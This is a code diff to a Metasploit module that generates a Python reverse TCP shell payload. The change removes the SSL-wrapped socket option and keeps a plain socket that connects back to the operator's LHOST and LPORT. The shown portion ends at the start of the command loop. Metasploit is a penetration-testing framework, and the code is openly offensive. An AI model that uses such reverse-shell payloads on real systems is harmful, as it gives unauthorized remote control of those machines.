@@ -23,7 +23,7 @@ module Metasploit3
 		super(merge_info(info,
 			'Name'          => 'Unix Command Shell, Reverse TCP (via python)',
 			'Version'       => '$Revision$',
-			'Description'   => 'Creates an interactive shell via python, supports SSL, encodes with base64 by design.',
+			'Description'   => 'Creates an interactive shell via python, encodes with base64 by design.',
 			'Author'        => 'RageLtMan',
 			'License'       => BSD_LICENSE,
 			'Platform'      => 'unix',
@@ -55,16 +55,9 @@ module Metasploit3
 		cmd = ''
 		dead = Rex::Text.rand_text_alpha(2)
 		# Set up the socket
-		if datastore['SSLHandler']
-			cmd += "import socket,subprocess,os,ssl\n"
-			cmd += "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
-			cmd += "so.connect(('#{ datastore['LHOST'] }',#{ datastore['LPORT'] }))\n"
-			cmd += "s=ssl.wrap_socket(so)\n"
-		else
-			cmd += "import socket,subprocess,os\n"
-			cmd += "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
-			cmd += "s.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))\n"
-		end
+		cmd += "import socket,subprocess,os\n"
+		cmd += "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+		cmd += "s.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))\n"
 		# The actual IO
 		cmd += "#{dead}=False\n"
 		cmd += "while not #{dead}:\n"
